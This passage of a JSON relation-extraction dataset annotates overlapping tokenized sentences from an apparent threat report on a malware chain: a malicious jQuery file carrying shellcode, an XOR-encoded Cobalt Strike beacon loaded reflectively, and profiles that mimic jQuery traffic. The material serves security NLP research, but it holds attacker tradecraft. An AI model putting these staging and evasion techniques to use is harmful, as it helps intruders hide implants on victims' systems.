"RF", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 2, "t": 9}, {"r": "WR", "evidence": [2, 3, 4], "t": 3, "h": 8}, {"r": "ST", "evidence": [2, 3, 4], "t": 4, "h": 8}, {"r": "RF", "evidence": [2, 3, 4], "t": 4, "h": 8}, {"r": "WR", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4], "h": 7, "t": 12}, {"r": "CO", "evidence": [4], "h": 7, "t": 10}, {"r": "CO", "evidence": [4], "h": 7, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 13}, {"r": "EX", "evidence": [4, 5, 6], "t": 11, "h": 14}, {"r": "WR", "evidence": [6], "h": 14, "t": 15}, {"r": "EX", "evidence": [6], "h": 14, "t": 15}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 16}, {"r": "EX", "evidence": [7], "h": 16, "t": 17}, {"r": "CO", "evidence": [7], "h": 17, "t": 19}, {"r": "CO", "evidence": [7], "h": 17, "t": 18}]}, {"title": "643-31", "sents": [["Download", "the", "malicious", "jquery-3", "."], ["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."], ["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."], ["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."], ["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."], ["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."], ["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."], ["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "jquery-3", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [6, 6], "name": "min.js", "pos": [1, 2], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [11, 11], "name": "memory location", "pos": [6, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [18, 18], "name": "shellcode", "pos": [4, 5], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [22, 22], "name": "jquery file", "pos": [8, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [31, 31], "name": "jquery file", "pos": [1, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [36, 36], "name": "Metasploit shellcode", "pos": [6, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [40, 40], "name": "jQuery file", "pos": [10, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "jQuery file", "pos": [28, 30], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "decoder shellcode", "pos": [32, 34], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [73, 73], "name": "beacon DLL", "pos": [43, 45], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [77, 77], "name": "beacon DLL", "pos": [1, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [91, 91], "name": "decoder shellcode", "pos": [6, 8], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "payload", "pos": [14, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [107, 107], "name": "Decoder shellcode", "pos": [0, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [112, 112], "name": "RAT payload", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [122, 122], "name": "RAT payload", "pos": [15, 17], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [127, 127], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [133, 133], "name": "beacon DLL", "pos": [2, 4], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [140, 140], "name": "decoder shellcode", "pos": [9, 11], "index": "19_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "WR", "evidence": [1, 2, 3], "t": 1, "h": 6}, {"r": "ST", "evidence": [1, 2, 3], "t": 2, "h": 6}, {"r": "RF", "evidence": [1, 2, 3], "t": 2, "h": 6}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3], "h": 5, "t": 10}, {"r": "CO", "evidence": [3], "h": 5, "t": 8}, {"r": "CO", "evidence": [3], "h": 5, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 11}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 5, "t": 18}, {"r": "EX", "evidence": [3, 4, 5], "t": 9, "h": 12}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "EX", "evidence": [5], "h": 12, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "CO", "evidence": [5, 6, 7], "h": 12, "t": 19}, {"r": "EX", "evidence": [6], "h": 14, "t": 15}, {"r": "CO", "evidence": [6], "h": 15, "t": 17}, {"r": "CO", "evidence": [6], "h": 15, "t": 16}]}, {"title": "643-32", "sents": [["0.", "min.js", "file", "to", "an", "executable", "memory", "location", "."], ["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."], ["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."], ["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."], ["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."], ["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."], ["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."], ["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "min.js", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [6, 6], "name": "memory location", "pos": [6, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [13, 13], "name": "shellcode", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "jquery file", "pos": [8, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [26, 26], "name": "jquery file", "pos": [1, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "Metasploit shellcode", "pos": [6, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "jQuery file", "pos": [10, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "jQuery file", "pos": [28, 30], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "decoder shellcode", "pos": [32, 34], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "beacon DLL", "pos": [43, 45], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "beacon DLL", "pos": [1, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [86, 86], "name": "decoder shellcode", "pos": [6, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "payload", "pos": [14, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "Decoder shellcode", "pos": [0, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [107, 107], "name": "RAT payload", "pos": [5, 7], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [117, 117], "name": "RAT payload", "pos": [15, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [122, 122], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [128, 128], "name": "beacon DLL", "pos": [2, 4], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [135, 135], "name": "decoder shellcode", "pos": [9, 11], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "beacon DLL", "pos": [30, 32], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 5}, {"r": "ST", "evidence": [0, 1, 2], "t": 1, "h": 5}, {"r": "RF", "evidence": [0, 1, 2], "t": 1, "h": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2], "h": 4, "t": 9}, {"r": "CO", "evidence": [2], "h": 4, "t": 7}, {"r": "CO", "evidence": [2], "h": 4, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 10}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 4, "t": 17}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 4, "t": 19}, {"r": "EX", "evidence": [2, 3, 4], "t": 8, "h": 11}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "CO", "evidence": [4, 5, 6], "h": 11, "t": 18}, {"r": "EX", "evidence": [5], "h": 13, "t": 14}, {"r": "CO", "evidence": [5], "h": 14, "t": 16}, {"r": "CO", "evidence": [5], "h": 14, "t": 15}]}, {"title": "643-33", "sents": [["Jump", "to", "the", "malicious", "shellcode", "embedded", "in", "the", "jquery", "file", "and", "start", "executing", "Stage", "3A", "."], ["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."], ["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."], ["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."], ["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."], ["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."], ["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."], ["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "shellcode", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "jquery file", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "jquery file", "pos": [1, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "Metasploit shellcode", "pos": [6, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "jQuery file", "pos": [10, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "jQuery file", "pos": [28, 30], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "decoder shellcode", "pos": [32, 34], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "beacon DLL", "pos": [43, 45], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "beacon DLL", "pos": [1, 3], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "decoder shellcode", "pos": [6, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "payload", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "Decoder shellcode", "pos": [0, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [98, 98], "name": "RAT payload", "pos": [5, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "RAT payload", "pos": [15, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [119, 119], "name": "beacon DLL", "pos": [2, 4], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [126, 126], "name": "decoder shellcode", "pos": [9, 11], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": "beacon DLL", "pos": [30, 32], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "beacons", "pos": [3, 4], "index": "18_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [196, 196], "name": ".profile", "pos": [9, 10], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1], "h": 2, "t": 7}, {"r": "CO", "evidence": [1], "h": 2, "t": 5}, {"r": "CO", "evidence": [1], "h": 2, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 8}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 2, "t": 15}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 2, "t": 17}, {"r": "EX", "evidence": [1, 2, 3], "t": 6, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [3], "h": 9, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "CO", "evidence": [3, 4, 5], "h": 9, "t": 16}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "CO", "evidence": [4], "h": 12, "t": 14}, {"r": "CO", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [7], "h": 18, "t": 19}, {"r": "EX", "evidence": [6, 7], "t": 17, "h": 18}, {"r": "WR", "evidence": [7], "h": 18, "t": 19}]}, {"title": "643-34", "sents": [["Malicious", "jquery", "file", ":", "Stage", "2A", "Metasploit", "shellcode", "downloading", "the", "jQuery", "file", "to", "executable", "memory", "and", "jumping", "to", "the", "specified", "offset", ":", "Stage", "3A", ":", "Decoder", "shellcodeThe", "malicious", "jQuery", "file", "contains", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "and", "the", "final", "Cobalt", "Strike", "beacon", "DLL", "."], ["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."], ["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."], ["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."], ["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."], ["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."], ["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."], ["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "jquery file", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "Metasploit shellcode", "pos": [6, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "jQuery file", "pos": [10, 12], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "jQuery file", "pos": [28, 30], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [32, 32], "name": "decoder shellcode", "pos": [32, 34], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [43, 43], "name": "beacon DLL", "pos": [43, 45], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "beacon DLL", "pos": [1, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "decoder shellcode", "pos": [6, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": "payload", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "Decoder shellcode", "pos": [0, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "RAT payload", "pos": [5, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "RAT payload", "pos": [15, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [97, 97], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "beacon DLL", "pos": [2, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [110, 110], "name": "decoder shellcode", "pos": [9, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "beacon DLL", "pos": [30, 32], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [174, 174], "name": "beacons", "pos": [3, 4], "index": "16_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [180, 180], "name": ".profile", "pos": [9, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "payload", "pos": [8, 9], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0], "h": 0, "t": 5}, {"r": "CO", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 13}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 15}, {"r": "EX", "evidence": [0, 1, 2], "t": 4, "h": 7}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "EX", "evidence": [2], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 14}, {"r": "EX", "evidence": [3], "h": 9, "t": 10}, {"r": "CO", "evidence": [3], "h": 10, "t": 12}, {"r": "CO", "evidence": [3], "h": 10, "t": 11}, {"r": "RD", "evidence": [6], "h": 16, "t": 17}, {"r": "EX", "evidence": [5, 6], "t": 15, "h": 16}, {"r": "WR", "evidence": [6], "h": 16, "t": 17}, {"r": "WR", "evidence": [6, 7], "h": 16, "t": 18}]}, {"title": "643-35", "sents": [["The", "beacon", "DLL", "is", ",", "however", ",", "XOR-encoded", "."], ["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."], ["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."], ["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."], ["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."], ["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."], ["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."], ["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "beacon DLL", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [15, 15], "name": "decoder shellcode", "pos": [6, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "payload", "pos": [14, 15], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "Decoder shellcode", "pos": [0, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [36, 36], "name": "RAT payload", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "RAT payload", "pos": [15, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [57, 57], "name": "beacon DLL", "pos": [2, 4], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "decoder shellcode", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "beacon DLL", "pos": [30, 32], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "beacons", "pos": [3, 4], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [134, 134], "name": ".profile", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [149, 149], "name": "payload", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [165, 165], "name": "profiles", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [169, 169], "name": "attack", "pos": [5, 6], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [179, 179], "name": "jquery request", "pos": [15, 17], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 8}, {"r": "EX", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2], "h": 4, "t": 6}, {"r": "CO", "evidence": [2], "h": 4, "t": 5}, {"r": "RD", "evidence": [5], "h": 10, "t": 11}, {"r": "EX", "evidence": [4, 5], "t": 9, "h": 10}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "WR", "evidence": [7], "t": 13, "h": 14}, {"r": "CO", "evidence": [7], "h": 13, "t": 15}]}, {"title": "643-36", "sents": [["It", "is", "the", "responsibility", "of", "the", "decoder", "shellcode", "to", "decode", "and", "activate", "this", "final", "payload", "in", "the", "dropper", "process", "'", "memory", "."], ["Decoder", "shellcode", "decoding", "the", "final", "RAT", "payload", ":", "Stage", "3B", ":", "Cobalt", "Strike", "beaconThe", "final", "RAT", "payload", "is", "actually", "a", "Cobalt", "Strike", "beacon", "."], ["Once", "the", "beacon", "DLL", "has", "been", "decoded", ",", "the", "decoder", "shellcode", "(", "Stage", "3A", ")", "jumps", "to", "the", "beginning", "of", "the", "MZ", "in", "memory", "instead", "of", "going", "to", "the", "DllEntryPoint", "."], ["This", "is", "done", "to", "calculate", "and", "jump", "to", "the", "address", "to", "the", "loader", "routine", "(", "usually", "also", "an", "exported", "subroutine", ")", "that", "will", "carry", "out", "reflective-DLL-loading", "of", "the", "Cobalt", "Strike", "beacon", "DLL", "in", "the", "dropper", "process", "'", "memory", "."], ["Configurations", "usedCobalt", "Strike", "beacons", "use", "configurations", "specified", "via", "``", ".profile", "''", "files", "in", "the", "framework", "."], ["These", "configurations", "describe", "various", "characteristics", "of", "the", "malicious", "payload", "(", "beacon", "binary", ")", "including", ":", "C2", "configurationCommunication", "protocolsProcess", "injection", "techniques", ",", "etc", "."], ["The", "profiles", "used", "in", "this", "attack", "by", "the", "beacon", "binaries", "attempt", "to", "mimic", "a", "legitimate", "jquery", "request", "."], ["113", "(", "google.com", ")", "Spawn", "processes", "=", "%", "windir", "%", "\\syswow64\\dllhost.exe", "%", "windir", "%", "\\sysnative\\dllhost.exe", "injection", "configuration", "=ntdll", ":", "RtlUserThreadStartCreateThreadNtQueueApc", "Cobalt", "Strike", "beacons", "used", "in", "this", "attack", "support", "a", "wide", "variety", "of", "capabilities", "(", "also", "known", "as", "commands", ")", "including", ":", "Execution", "of", "arbitrary", "code", "in", "target", "processes", "via", "injection", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "decoder shellcode", "pos": [6, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "payload", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "Decoder shellcode", "pos": [0, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "RAT payload", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "RAT payload", "pos": [15, 17], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "Cobalt Strike beacon", "pos": [20, 23], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "beacon DLL", "pos": [2, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "decoder shellcode", "pos": [9, 11], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "beacon DLL", "pos": [30, 32], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [119, 119], "name": "beacons", "pos": [3, 4], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [125, 125], "name": ".profile", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": "payload", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "profiles", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 